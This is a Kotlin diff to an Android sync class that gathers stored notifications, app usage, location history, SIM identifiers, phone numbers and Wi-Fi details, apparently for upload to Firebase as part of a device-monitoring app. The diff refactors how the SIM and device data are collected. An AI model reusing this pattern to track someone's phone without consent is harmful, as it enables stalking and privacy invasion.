@@ -180,159 +180,32 @@ class FirebaseSyncEngine(private val context: Context) {
         val notifications = try { db.notificationDao().getAllNotificationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Notifications: ${e.message}"); emptyList() }
         val appUsage = try { db.appUsageDao().getAllAppUsageSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Usage: ${e.message}"); emptyList() }
         val locationList = try { db.locationDao().getAllLocationsSync() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Locations: ${e.message}"); emptyList() }
-        val deviceInfo = try { DeviceInfoSyncManager(context).collectAndSyncDeviceInfo() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading DeviceInfo: ${e.message}"); null }
+        val deviceInfoSyncManager = DeviceInfoSyncManager(context)
+        val deviceInfoMap = try { deviceInfoSyncManager.syncDeviceInfo().getOrNull() ?: emptyMap() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading DeviceInfo: ${e.message}"); emptyMap() }
+        val deviceInfo = try { deviceInfoSyncManager.collectAndSyncDeviceInfo() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error saving DeviceInfoEntity: ${e.message}"); null }
         val location = try { LocationSyncManager(context).captureAndSyncLocation() } catch (e: Exception) { Log.e("FirebaseSyncEngine", "Error loading Location: ${e.message}"); null }
 
         val timestamp = System.currentTimeMillis()
 
-        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
-
-        val activeSubList: List<SubscriptionInfo>? = try {
-            subManager?.activeSubscriptionInfoList
-        } catch (_: Exception) {
-            null
-        }
-
-        val simSlotsMap = mutableMapOf<String, Map<String, Any>>()
-        var simCount = 0
-
-        if (!activeSubList.isNullOrEmpty()) {
-            simCount = activeSubList.size
-            activeSubList.forEachIndexed { index, subInfo ->
-                val slotIndex = try {
-                    subInfo.simSlotIndex
-                } catch (_: Exception) {
-                    index
-                }
-
-                val subId = subInfo.subscriptionId
-                val subTelephony = try {
-                    telephonyManager.createForSubscriptionId(subId)
-                } catch (_: Exception) {
-                    telephonyManager
-                }
-
-                val carrier = subInfo.carrierName?.toString()?.takeIf { it.isNotBlank() }
-                    ?: subInfo.displayName?.toString()?.takeIf { it.isNotBlank() }
-                    ?: subTelephony.simOperatorName.takeIf { it.isNotBlank() }
-                    ?: subTelephony.networkOperatorName.ifEmpty { "Active Carrier" }
-
-                val country = subInfo.countryIso?.uppercase()?.takeIf { it.isNotBlank() }
-                    ?: subTelephony.simCountryIso.uppercase().ifEmpty { "N/A" }
-
-                val iccid = subInfo.iccId?.takeIf { it.isNotBlank() } ?: "N/A"
-
-                var phone: String? = null
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && subManager != null) {
-                    try {
-                        phone = subManager.getPhoneNumber(subId)?.takeIf { it.isNotBlank() }
-                    } catch (_: Exception) {}
-                }
-                if (phone == null) {
-                    try {
-                        @Suppress("DEPRECATION")
-                        phone = subInfo.number?.takeIf { it.isNotBlank() }
-                    } catch (_: Exception) {}
-                }
-                if (phone == null) {
-                    try {
-                        phone = subTelephony.line1Number?.takeIf { it.isNotBlank() }
-                    } catch (_: Exception) {}
-                }
-                if (phone == null) {
-                    try {
-                        phone = telephonyManager.line1Number?.takeIf { it.isNotBlank() }
-                    } catch (_: Exception) {}
-                }
-
-                val operatorCode = subTelephony.simOperator.ifEmpty { subTelephony.networkOperator }
-                val mccMncStr = if (operatorCode.length >= 5) {
-                    "${operatorCode.substring(0, 3)} / ${operatorCode.substring(3)}"
-                } else "N/A"
-
-                val simMap = mapOf<String, Any>(
-                    "slotIndex" to slotIndex,
-                    "subscriptionId" to subId,
-                    "operatorName" to carrier,
-                    "countryIso" to country,
-                    "simSerialNumber" to iccid,
-                    "subscriberId" to mccMncStr,
-                    "isActive" to true,
-                    "phoneNumber" to (phone ?: "N/A"),
-                    "dataRoaming" to subTelephony.isNetworkRoaming,
-                    "networkType" to (deviceInfo?.networkType ?: "N/A"),
-                    "dataState" to (deviceInfo?.dataState ?: "N/A")
-                )
-
-                simSlotsMap[slotIndex.toString()] = simMap
-            }
-        }
-
-        if (simSlotsMap.isEmpty()) {
-            val primarySimMap = mapOf<String, Any>(
-                "slotIndex" to 0,
-                "operatorName" to (deviceInfo?.carrierName ?: "N/A"),
-                "countryIso" to (deviceInfo?.countryIso ?: "N/A"),
-                "simSerialNumber" to (deviceInfo?.iccid ?: "N/A"),
-                "subscriberId" to (deviceInfo?.mccMnc ?: "N/A"),
-                "isActive" to (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true),
-                "phoneNumber" to (deviceInfo?.phoneNumber ?: "N/A"),
-                "dataRoaming" to (deviceInfo?.isRoaming ?: false),
-                "networkType" to (deviceInfo?.networkType ?: "N/A"),
-                "dataState" to (deviceInfo?.dataState ?: "N/A")
-            )
-            simSlotsMap["0"] = primarySimMap
-            simCount = if (deviceInfo?.simState?.contains("Ready", ignoreCase = true) == true) 1 else 0
-        }
-
-        val primarySimMap = simSlotsMap["0"] ?: simSlotsMap.values.firstOrNull() ?: mapOf<String, Any>()
-        val phoneCount = try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                telephonyManager.activeModemCount
-            } else {
-                @Suppress("DEPRECATION")
-                telephonyManager.phoneCount
-            }
-        } catch (_: Exception) { 1 }
-
-        val isMultiSim = simCount > 1 || phoneCount > 1
-
-        val simInfoMap = mapOf<String, Any>(
-            "simCount" to if (simCount > 0) simCount else (if (isMultiSim) 2 else 1),
-            "isMultiSim" to isMultiSim,
-            "primarySim" to primarySimMap,
-            "simSlots" to simSlotsMap
-        )
-
-        val freeStorageGb = (deviceInfo?.freeStorageMb ?: 0) / 1024.0
-        val totalStorageGb = (deviceInfo?.totalStorageMb ?: 0) / 1024.0
+        val freeStorageGb = (deviceInfoMap["freeStorageGb"] as? Double)
+            ?: ((deviceInfo?.freeStorageMb ?: 0) / 1024.0)
+        val totalStorageGb = (deviceInfoMap["totalStorageGb"] as? Double)
+            ?: ((deviceInfo?.totalStorageMb ?: 0) / 1024.0)
         val storageFormatted = if (totalStorageGb > 0) {
-            String.format(Locale.US, "%.1f GB free of %.1f GB", freeStorageGb, totalStorageGb)
+            String.format(Locale.US, "%.2f GB free of %.2f GB", freeStorageGb, totalStorageGb)
         } else "N/A"
 
-        val deviceInfoPayload = mapOf(
-            "model" to (Build.MODEL),
-            "manufacturer" to (Build.MANUFACTURER),
-            "brand" to (Build.BRAND),
-            "androidVersion" to (Build.VERSION.RELEASE),
-            "batteryLevel" to (deviceInfo?.batteryLevel ?: 0),
-            "isCharging" to (deviceInfo?.isCharging ?: false),
-            "batteryStatus" to if (deviceInfo?.isCharging == true) "Charging" else "Discharging",
-            "networkType" to (deviceInfo?.networkType ?: "N/A"),
-            "wifiSsid" to (deviceInfo?.wifiSsid ?: "Not connected"),
-            "wifiState" to if ((deviceInfo?.wifiSsid ?: "Not connected") != "Not connected") "CONNECTED" else "DISCONNECTED",
-            "wifiConnected" to ((deviceInfo?.wifiSsid ?: "Not connected") != "Not connected"),
-            "wifiIpAddress" to (deviceInfo?.localIp ?: ""),
-            "wifiSignalStrength" to (deviceInfo?.wifiRssi ?: 0),
-            "wifiLinkSpeed" to "",
-            "wifiMacAddress" to (deviceInfo?.macAddress ?: ""),
-            "storageAvailableFormatted" to storageFormatted,
-            "ramAvailableFormatted" to getRamUsageFormatted(),
-            "isRooted" to false,
-            "simInfo" to simInfoMap,
-            "lastSyncTimestamp" to timestamp
-        )
+        val deviceInfoPayload = mutableMapOf<String, Any>().apply {
+            putAll(deviceInfoMap)
+            put("brand", Build.BRAND)
+            put("storageAvailableFormatted", storageFormatted)
+            put("ramAvailableFormatted", getRamUsageFormatted())
+            put("isRooted", false)
+            put("lastSyncTimestamp", timestamp)
+            put("batteryStatus", if ((deviceInfoMap["isCharging"] as? Boolean) == true) "Charging" else "Discharging")
+            put("wifiConnected", (deviceInfoMap["isWifiConnected"] as? Boolean) ?: false)
+            put("wifiState", (deviceInfoMap["wifiState"] as? String) ?: "UNKNOWN")
+        }
 
         val currentLat = location?.latitude ?: 0.0
         val currentLng = location?.longitude ?: 0.0
